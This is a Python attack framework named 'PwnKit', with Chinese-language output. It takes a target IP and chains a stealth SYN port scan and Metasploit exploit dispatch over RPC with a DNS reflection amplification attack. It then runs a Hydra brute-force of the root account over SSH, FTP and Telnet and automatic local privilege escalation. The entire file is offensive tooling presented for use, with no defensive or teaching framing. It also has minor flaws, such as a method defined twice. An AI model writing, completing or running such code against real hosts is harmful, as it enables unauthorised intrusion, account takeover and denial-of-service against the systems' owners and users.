#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import signal
import importlib.util
import socket
import time
import threading
import subprocess
import signal
from queue import Queue
from scapy.all import IP, TCP, sr1
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError

print_lock = threading.Lock()
def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)
        time.sleep(0.1)

signal.signal(signal.SIGINT, lambda sig, frame: (safe_print("[!] Error"), os._exit(0)))

class PwnKit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.config = self.load_config()
        self.modules = []
        self.msf_client = None
        self.msf_process = None
        self.session = None
        self.load_all_modules()

    def load_config(self):
        config_path = os.path.join(os.path.dirname(__file__), "config.json")
        with open(config_path, "r") as f:
            return json.load(f)

    def load_all_modules(self):
        modules_dir = os.path.join(os.path.dirname(__file__), "modules")
        for root, dirs, files in os.walk(modules_dir):
            for file in files:
                if file.endswith(".py") and not file.startswith("__"):
                    module_path = os.path.join(root, file)
                    self._load_module(module_path)
        safe_print(f"[+] 已加载 {len(self.modules)} 个漏洞利用模块\n")

    def _load_module(self, path):
        try:
            spec = importlib.util.spec_from_file_location("module", path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            if hasattr(mod, "Module"):
                module_instance = mod.Module()
                module_instance.pwnkit = self
                self.modules.append(module_instance)
                safe_print(f"    └─ {module_instance.name}")
        except Exception as e:
            safe_print(f"[-] 加载模块失败 {path}: {e}")

    def _start_msf_rpc(self):
        try:
            test_client = MsfRpcClient(
                self.config["msf_rpc_pass"],
                server=self.config["msf_rpc_host"],
                port=self.config["msf_rpc_port"],
                ssl=False
            )
            safe_print("[+] MSF RPC 服务已在运行")
            return True
        except:
            pass

        safe_print("[*] 正在启动 MSF RPC 服务...")
        cmd = [
            "msfrpcd",
            "-U", "msf",
            "-P", self.config["msf_rpc_pass"],
            "-S",
            "-a", self.config["msf_rpc_host"],
            "-p", str(self.config["msf_rpc_port"]),
            "-f"
        ]
        try:
            with open(os.devnull, 'wb') as devnull:
                self.msf_process = subprocess.Popen(
                    cmd,
                    stdout=devnull,
                    stderr=devnull,
                    preexec_fn=os.setsid
                )
            for _ in range(30):
                time.sleep(0.5)
                try:
                    test_client = MsfRpcClient(
                        self.config["msf_rpc_pass"],
                        server=self.config["msf_rpc_host"],
                        port=self.config["msf_rpc_port"],
                        ssl=False
                    )
                    safe_print("[+] MSF RPC 服务启动成功")
                    return True
                except:
                    pass
            safe_print("[-] MSF RPC 服务启动超时")
            return False
        except Exception as e:
            safe_print(f"[-] 启动 MSF RPC 服务失败: {e}")
            return False

    def connect_msf(self):
        if self.msf_client is None:
            if self._start_msf_rpc():
                try:
                    self.msf_client = MsfRpcClient(
                        self.config["msf_rpc_pass"],
                        server=self.config["msf_rpc_host"],
                        port=self.config["msf_rpc_port"],
                        ssl=False
                    )
                    safe_print("[+] MSF RPC 连接成功")
                except Exception as e:
                    safe_print(f"[-] MSF RPC 连接失败: {e}")
                    sys.exit(1)
            else:
                safe_print("[-] 无法启动或连接至 MSF RPC 服务，MSF 模块将不可用")
        return self.msf_client

    def stealth_port_scan(self, ports):
        open_ports = []
        for port in ports:
            pkt = IP(dst=self.target_ip)/TCP(dport=port, flags="S")
            ans = sr1(pkt, timeout=1, verbose=0)
            if ans and ans.haslayer(TCP) and ans.getlayer(TCP).flags == 0x12:
                open_ports.append(port)
                rst = IP(dst=self.target_ip)/TCP(dport=port, flags="R")
                sr1(rst, timeout=0.1, verbose=0)
            time.sleep(0.3)
        return open_ports

    def collect_all_module_ports(self):
        ports = set()
        for mod in self.modules:
            if mod.port is not None:
                ports.add(mod.port)
        return list(ports)

    def run_full_assault(self):
        safe_print(f"[*] 目标: {self.target_ip}")
        ports_to_scan = self.collect_all_module_ports()
        open_ports = self.stealth_port_scan(ports_to_scan)
        safe_print(f"[+] 发现开放端口: {open_ports}")
        
        for port in open_ports:
            t = threading.Thread(target=self._try_dynamic_msf, args=(port,))
            t.start()
        t_reflect = threading.Thread(target=self._start_reflection_attack)
        t_reflect.start()

        # 构建任务队列
        task_queue = Queue()
        for mod in self.modules:
            if mod.name == "Dynamic MSF Exploit Dispatcher":
                continue  # 动态模块由 _try_dynamic_msf 单独调用，不入队列
            if mod.port is None or mod.port in open_ports:
                task_queue.put(mod)

        web_ports = [80, 443, 8080, 8443]
        if any(p in open_ports for p in web_ports):
            for mod in self.modules:
#                if mod.name == "Web Vulnerability":
#                    already_in = False
#                    task_queue.put(mod)
#                    safe_print("[*] 检测到 Web 端口，已添加 Web 漏洞扫描器")
#                    break
                     pass

        success_event = threading.Event()
        threads = []
        for _ in range(min(8, task_queue.qsize())):
            t = threading.Thread(target=self._attack_worker, args=(task_queue, success_event))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if not success_event.is_set():
            self._launch_distributed_bruteforce(open_ports)

    def _attack_worker(self, queue, success_event):
        while not queue.empty() and not success_event.is_set():
            mod = queue.get()
            try:
                safe_print(f"[*] 尝试模块: {mod.name}")
                kwargs = {"target_ip": self.target_ip, "lhost": self.config["lhost"]}
            
                if hasattr(mod, 'use_msf') and mod.use_msf:
                    mod.msf_client = self.connect_msf()
            
                if mod.port is not None:
                    kwargs["target_port"] = mod.port
                elif mod.name == "Port Spoofing & Service Trigger Exploits":
                    kwargs["target_port"] = None
                elif mod.name == "Distributed Hydra Brute-Force Orchestrator":
                    pass
                elif mod.name == "Qualcomm Mali GPU Driver Local Privilege Escalation":
                    # 只有 Mali 提权模块需要 session，且只有在已获得初始 shell 时才传入
                    if self.session is not None:
                        kwargs["session"] = self.session

                success, result = mod.exploit(**kwargs)
                if success:
                    safe_print(f"[+] 攻击成功！{result}")
                    success_event.set()
                    if not self._is_root(result):
                        self._auto_privesc(result)
                else:
                    safe_print(f"[-] {mod.name} 失败: {result}")
            except Exception as e:
                safe_print(f"[-] 模块执行异常: {e}")
            finally:
                queue.task_done()
    
    def _start_reflection_attack(self):
        for mod in self.modules:
            if mod.name == "DNS Reflection Amplification Attack":
                mod.exploit(target_ip=self.target_ip)
                break

    def _launch_distributed_bruteforce(self, open_ports):
        safe_print("[*] 尝试分布式密码爆破...")
        for mod in self.modules:
            if mod.name == "Distributed Hydra Brute-Force Orchestrator":
                for port in open_ports:
                    service = self._guess_service(port)
                    if service in ["ssh", "ftp", "telnet"]:
                        success, msg = mod.exploit(target_ip=self.target_ip, target_port=port, service=service, user="root")
                        if success:
                            return
                break
    
    def _try_dynamic_msf(self, port,**kwargs):
        """动态调用 MSF 模块尝试利用指定端口"""
        for mod in self.modules:
            if mod.name == "Dynamic MSF Exploit Dispatcher":
                safe_print(f"[*] 动态 MSF 调度器正在处理端口 {port}...")
                try:
                    if hasattr(mod, 'use_msf') and mod.use_msf:
                        mod.msf_client = self.connect_msf()
                    success, result = mod.exploit(
                        target_ip=self.target_ip,
                        target_port=port,
                        lhost=self.config["lhost"]
                    )
                    if success:
                        safe_print(f"[+] 动态 MSF 成功利用端口 {port}: {result}")
                        # 可以在这里记录 session 等
                except Exception as e:
                    safe_print(f"[-] 动态 MSF 调度异常: {e}")
                break

    def _guess_service(self, port):
        guess = {21: "ftp", 22: "ssh", 23: "telnet", 3389: "rdp", 3306: "mysql", 1433: "mssql"}
        return guess.get(port, "unknown")

    def _is_root(self, result):
        # 简单判断，可根据实际情况修改
        return "root" in str(result).lower() or "uid=0" in str(result)
    
    def _guess_service(self, port):
        guess = {21: "ftp", 22: "ssh", 23: "telnet", 3389: "rdp", 3306: "mysql", 1433: "mssql"}
        if 5900 <= port <= 5910:
            return "vnc"
        return guess.get(port, "unknown")
    
    def _auto_privesc(self, session_info):
        safe_print("[*] 尝试自动本地提权...")
        for mod in self.modules:
            if mod.port is None and "privesc" in mod.name.lower():
                try:
                    # 只有 Mali 提权模块需要 session 参数
                    if mod.name == "Qualcomm Mali GPU Driver Local Privilege Escalation":
                        success, msg = mod.exploit(session=self.session)
                    else:
                        success, msg = mod.exploit()
                    if success:
                        safe_print(f"[+] 提权成功: {msg}")
                        return
                except Exception as e:
                    safe_print(f"[-] 提权模块执行异常: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        safe_print(f"用法: {sys.argv[0]} <目标IP>")
        sys.exit(1)
    pk = PwnKit(sys.argv[1])
    try:
        pk.run_full_assault()
    finally:
        if pk.msf_process:
            os.killpg(os.getpgid(pk.msf_process.pid), signal.SIGTERM)
